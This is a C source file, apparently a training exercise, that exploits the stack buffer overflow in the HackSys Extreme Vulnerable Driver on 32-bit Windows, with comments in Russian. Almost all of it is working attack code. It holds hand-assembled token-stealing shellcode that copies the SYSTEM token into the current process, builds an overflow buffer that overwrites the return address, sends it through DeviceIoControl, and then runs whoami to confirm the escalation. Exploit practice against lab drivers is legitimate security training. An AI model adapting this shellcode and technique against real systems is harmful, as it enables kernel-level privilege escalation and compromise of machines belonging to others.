#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
#include <Windows.h>
#include <stdio.h>
void BufferOverflow() {
    unsigned char shellcode[] = { 0x60,
    0x64, 0xA1, 0x24, 0x01, 0x00, 0x00,
    0x8B, 0x40, 0x50,
    0x89, 0xC1,
    0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00,
        //---[Копируем токен System PID]
        0xBA, 0x04, 0x00, 0x00, 0x00,
        0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,
        0x2D, 0xB8, 0x00, 0x00, 0x00,
        0x39, 0x90, 0xB4, 0x00, 0x00, 0x00,
        0x75, 0xED,
        0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00,
        0x89, 0x91, 0xF8, 0x00, 0x00, 0x00,
        //---[Восстанавливаем]
        0x61,                               // popad
        0x31, 0xC0,                         // NTSTATUS->STATUS_SUCCESS :p
        0x5D,                               // pop ebp
        0xC2, 0x08, 0x00                    // ret 8 
    };

    HANDLE device = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
    printf("[+] Open device handle 0x%x\n", device);

    LPVOID buffer = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //
    printf("[+] Allocate buffer 0x%x\n", buffer);

    RtlCopyMemory(buffer, shellcode, sizeof(shellcode));
    char* lpInBuffer = (char*)VirtualAlloc(NULL, 2080 + 4, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //выделяю страницу размером offset + eip

    RtlFillMemory(lpInBuffer, 2080, '\x41'); //заполняю оффсет к eip байтам '\x41'
    RtlCopyMemory(&lpInBuffer[2080], &buffer, 4); //копирую оставшийся адрес буфера на место eip по адресу "указатель на 2080й символ"

    DWORD retn;
    DeviceIoControl(device, HACKSYS_EVD_IOCTL_STACK_OVERFLOW, lpInBuffer, 2080 + 4, NULL, NULL, &retn, NULL);
    system("whoami");
}